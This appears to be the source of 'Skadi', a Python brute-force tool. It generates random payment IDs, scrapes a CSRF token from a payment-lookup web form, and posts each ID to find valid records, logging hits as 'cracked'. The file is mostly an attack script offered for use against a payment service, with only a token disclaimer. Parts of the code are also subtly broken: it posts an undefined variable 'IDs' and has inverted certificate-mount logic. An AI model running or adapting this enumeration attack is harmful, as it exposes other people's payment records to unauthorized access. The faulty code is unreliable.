#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Rainer Christian Bjoern Herold

# Libraries
from Resources.HF import *

# Variables
File_Path = dirname(realpath(__file__))
Template_Path = join(File_Path, 'skadi.tmp')
Program_Description = """-------------------------------------------------------------------------------------
|  Created by Rainer Christian Bjoern Herold                                        |
|  Copyright 2022. All rights reserved.                                             |
|                                                                                   |
|  Please do not use the program for illegal activities.                            |
|                                                                                   |
|  If you got any problems don't hesitate to contact me so I can try to fix them.   |
-------------------------------------------------------------------------------------
"""

# Arrays
Array_Threads, Array_Targets, Array_Template = [], [], []

# Colors
class Colors:
    GREEN = '\033[32m'
    ORANGE = '\033[33m'
    BLUE = '\033[34m'
    RED = '\033[31m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Functions
def Stdout_Output(Text_Array):
    for char in Text_Array:
        stdout.write(char)
        stdout.flush()
        sleep(0.01)

def Initials():
    if (osname == 'nt'): system('cls')
    else: system('clear')
    Header = """
💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
💀\t\t\t\t\t\t\t\t💀
💀\t\t             """+Colors.UNDERLINE+"Skadi"+Colors.RESET+"""\t\t\t\t💀
💀\t\t\t  """+Colors.ORANGE+"Version "+Colors.BLUE+"0.1"+Colors.RESET+"""\t\t\t\t💀
💀\t\t\t\t\t\t\t\t💀
💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀\n\n
"""
    Stdout_Output(Header)

def Read_File(path):
     with open(path, 'r') as f:
         return f.read().splitlines()

def Write_File(path, text):
     with open(path, 'a') as f:
         f.write(f'{text}\n')

def Generate_List(path, max_ids, Temp_Text = [], Array_Temp = []):
        #################################
        # Thx to @Atreus92 for the idea #
        def Generator():
        	a,b,c,d = randint(0,9),randint(0,9),randint(0,9),randint(0,9)
        	return (f'{a}{b}{c}{d}')
        #################################

        print (f"{max_ids} new Payment IDs will be generated.\n\n"+Colors.BLUE+"-----------------------------------------------------------------"+Colors.RESET)
        n = 0
        while (len(Array_Temp) != max_ids):
            ZahlungsID = str(f'0000-{Generator()}-{Generator()}-{Generator()}-{Generator()}')
            if (ZahlungsID not in Array_Temp):
                Array_Temp.append(str(ZahlungsID))
                n += 1
                print (f'\t\t\t    {n}', end='\r'), sleep(0.001)
        else: print (f'\t\t\t    {n}'), sleep(0.45), system('clear'), Initials()

        if (exists(path)): Temp_Text = Read_File(path)
        with open(path, 'a') as f:
            for Zahl_ID in array(Array_Temp):
                if (Zahl_ID not in Temp_Text):
                    f.write(f'{Zahl_ID}\n')

def Brute_Target(url, id, seconds, read_path, output_path, pk_path, pk_pw, template_path):
        while True:
            try:
                s = Session()
                if (pk_path == None): s.mount(url, Pkcs12Adapter(pkcs12_filename=pk_path, pkcs12_password=pk_pw))
                r = s.get(url)
                break
            except ConnectionError:
                sleep(2.5)
                s = Session()
                if (pk_path == None): s.mount(url, Pkcs12Adapter(pkcs12_filename=pk_path, pkcs12_password=pk_pw))
                r = s.get(url)
                sleep(2.5)

        for i in array(str(r.text).splitlines()):
            if ("_csrf" in i):
                CSRF = i.split('value="')[1][:-3]
                break
        Data = {'_csrf': CSRF,'zahlvorgangId': IDs}
        Cookies = dict(s.cookies)
        r = post(url, data=Data, cookies=Cookies)
        if ("200" in str(r)):
            if ("No entry for given payment id found." not in str(r.text)):
                print (Colors.ORANGE+'[+]'+Colors.RESET+Colors.RED+f' {id} was cracked!'+Colors.RESET)
                Write_File(output_path, id)
            else:
                print (Colors.BLUE+"[-]"+Colors.RESET+f' {id} was not successful.')
                Write_File(template_path, id)
        else: print (str(r))
        sleep(seconds)
